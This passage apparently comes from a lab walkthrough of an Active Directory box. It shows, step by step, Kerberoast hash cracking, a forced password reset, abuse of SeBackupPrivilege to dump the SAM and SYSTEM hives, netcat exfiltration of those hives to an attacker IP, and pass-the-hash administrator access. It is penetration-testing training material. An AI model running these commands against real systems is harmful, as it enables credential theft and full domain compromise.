echo '$krb5tgs$23$*Hazel.Green$HOKKAIDO-AEROSPACE.COM$hokkaido-aerospace.com/Hazel.Green*$6298d899db5e17c343b3a6d5d23e652c$9d4ae18a327e04b312272df4990d7ca4d1c384005c3e8693b758683d7806ef1ce55d23a430c1b0bb3876eaa0f7dbeda58cc19b32764e2fe192645f4ef33384a8bad02a29581796a1c947355ef3acf0ab689688d6c4c9571b57144062058a1239c044d74d8dabccffde2b9b92a38723d02a02e391063c464ccbbc5c95340f001a1f9c7c9f00bfeae51c9b22235dee97f3e05f51a519aaf254d7d6411b99e4e1e6d81e90fdbaefe2a9655e5d4e8f805b3145ac5effe79f887977cb33fd19ae11d13563c54450d5e97cf61ef97cc166a73258e006ac269d7c8770dbc0feea332377f96c6c4145ef5efebc57e52ed833c11a39961cc20bbb712abd3cbdb9d984ddd5a7851f9f5cb77f124045bd72d28e784ed6df14a35f6d32cd970565aab8682ddfa85a1e474ed0c874f8154fa4bae43418846fdf8df2de40ada3bbc75528ddc76bb949d3e0cb06ea9fb3652dddc2b556e284e05712c312e955732aad78db29de8f912270420da8d5725090f4e2e35064a76e1e29d6d3dc8d4f4effba543056c5cf9cedd9b488dc85ae6cd3c618aca2ed2772064254979af1e0ee80045543e3a22d0d0679d55b82f0c487037f122e091736350b645f063a7da109ca2b9d14d0645d909324e451331905c926d6bf6355996b029c61dc88da688b8a0d8cbca156902e22bfebc244bd1250eb78af1bac0522d916982209b85fb9b835e9d2424cc36c5b5a2997c6f5f016d90b3210cad4a5ca43a33fa5801b8c9cf118f0eefe3a1f069aefd78261b9a7ed965df7f4acc3566b9809b2224cad8e0dd67fdeb2f0fb086d94886ca5ee8f0378cf26a97fc504632ae1e9377d3e288ce5d9a7c352065de9d7ae57e1390033241efb72114ce7261d7e16e398d1f6c8d74fe016eeffab9f1444c64c3d53e3ed149c680388a8bb95965ad5488b7ecaec6c6d5079485f8dea7a49e3a18da259677e29855e31b7dce53a82640aaf9940e206f496b120d71b81e64ce76008255afbbdbe2c824c4345df67eb115197ec0f2c7c667db6008bab800fdd62a23c8220e6be6f36b64c9579551fbc33b466b7b60405bb1d3263d447ef4b59ac32a5187917a7564eaa85a835c8cb5a67693e9e3847d88d0bd827dc49fcb53ed5b1ec5e8e4875cae6fba830e2ed63f2eafd93b4df48cb068b881833e5a921cdaf6fef1f5626b1d198c30d0baadf68ff1bb26ecdd1efb53f2cc0179aea03cbcbb277e9178a212c503deea3966c727e4043daf023126742894f5ab6c8d90d8a7eb5ba06bd9df5a4c73d1db53a4fcda8c43e98eb0da98013b4578ee3f1ce01526932f6b169a4d9656a779495d8a20d42ac4eaeace178d905213c31b514a242b66adddef42ab4855dee81a84e62bc1d46136e49a04d136573db9797761301d16268c021ef2fdacb10ec16ce7c34f6826feb0924b62b97cd197f438d92fe28c9ae55775933324a9d2e79838051cd9dfd778ad5305b3947b94ba2244c39faeebcedf5ee7fbbffaca580e53222ed110ba1f426d7a7f0954de97f5ed9ca1e77dc8c37e80f737fd0cd4ca1d0adbea336d483c8a79e2ee80528a69aa2435eeec0af9ae650ba733007e63dafe44b0628a15e2ca87eba2660de8eb63dc18ead8f54fa565b2938fd6516c279a08cc514f4b213
'>hash5.txt
```

Cracking the Kerberos TGS hash for the user "Hazel.Green" with John The Ripper, successfully recovering the password "haze1988".

```bash
john --format=krb5tgs hash5.txt --wordlist=/usr/share/wordlists/rockyou.txt                     
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 5 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
haze1988         (?)     
1g 0:00:00:05 DONE (2025-12-10 19:25) 0.1851g/s 1418Kp/s 1418Kc/s 1418KC/s haze77..haynes7186
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

Using the compromised credentials for "hazel.green" with the bloodyAD tool to perform a targeted password reset attack, changing the password for the user "molly.smith" to a known value.

```bash
uv run bloodyAD --host  192.168.236.40  -d  hokkaido-aerospace.com  -u hazel.green -p haze1988 set password  molly.smith 'Password1234!'
[+] Password changed successfully!

```

Establishing a Remote Desktop Protocol connection to the target host using the newly set credentials for the user "molly.smith".

```bash
 xfreerdp /u:molly.smith /p:'Password1234!' /v:192.168.236.40 +clipboard
```

Reading the contents of the "local.txt" file from the compromised user's desktop, which may contain a proof of local access or a user flag.

```bash
PS C:\> type local.txt
3290230f2a0dac98bf42d6cfa0f2d7c8
```

Enumerating the privileges assigned to the current user session, identifying that "SeBackupPrivilege" is granted but currently disabled. This privilege can be abused for privilege escalation.

```bash
C:\users\molly.smith>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                         State   
============================= =================================== ========
SeMachineAccountPrivilege     Add workstations to domain          Disabled
SeSystemtimePrivilege         Change the system time              Disabled
SeBackupPrivilege             Back up files and directories       Disabled
SeRestorePrivilege            Restore files and directories       Disabled
SeShutdownPrivilege           Shut down the system                Disabled
SeChangeNotifyPrivilege       Bypass traverse checking            Enabled 
SeRemoteShutdownPrivilege     Force shutdown from a remote system Disabled
SeIncreaseWorkingSetPrivilege Increase a process working set      Disabled
SeTimeZonePrivilege           Change the time zone                Disabled
```

Abusing the SeBackupPrivilege to dump the SAM and SYSTEM registry hives to disk for later extraction and cracking of local password hashes.

```bash
PS C:\> reg save hklm\sam c:\Temp\sam
The operation completed successfully.
PS C:\> reg save hklm\system c:\Temp\system
The operation completed successfully.
```

Transferring the dumped SAM and SYSTEM hive files to the attacker machine using Netcat for offline processing.

```bash
PS C:\temp> cmd /c "nc64.exe 192.168.45.181 444 < C:\Temp\sam"
PS C:\temp> cmd /c "nc64.exe 192.168.45.181 44444 < C:\Temp\system"
```

Receiving the transferred SAM and SYSTEM registry hive files on the attacker's listening Netcat sessions for credential extraction.

```bash
 nc -lvp 444 > sam 
listening on [any] 444 ...
connect to [192.168.45.181] from hokkaido-aerospace.com [192.168.236.40] 50472

nc -lvp 44444 > system
listening on [any] 44444 ...
connect to [192.168.45.181] from hokkaido-aerospace.com [192.168.236.40] 50522
```

Using Impacket's secretsdump to extract NTLM password hashes from the transferred registry hives, successfully recovering the Administrator's NTLM hash.

```bash
impacket-secretsdump LOCAL -system system -sam sam

[*] Target system bootKey: 0x2fcb0ca02fb5133abd227a05724cd961  
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)  
Administrator:500:aad3b435b51404eeaad3b435b51404ee:d752482897d54e239376fddb2a2109e4:::  
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::  
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::  
[-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.  
[*] Cleaning up...

```

Using the cracked Administrator NTLM hash to authenticate to the target via WinRM, successfully gaining administrative access and reading the final proof file.

```bash
evil-winrm -i 192.168.236.40 -u Administrator -H 'd752482897d54e239376fddb2a2109e4'
                                    
Evil-WinRM* PS C:\Users\Administrator\Desktop> cat proof.txt
62eae13824bfb58f252b01a1222e96dd
```
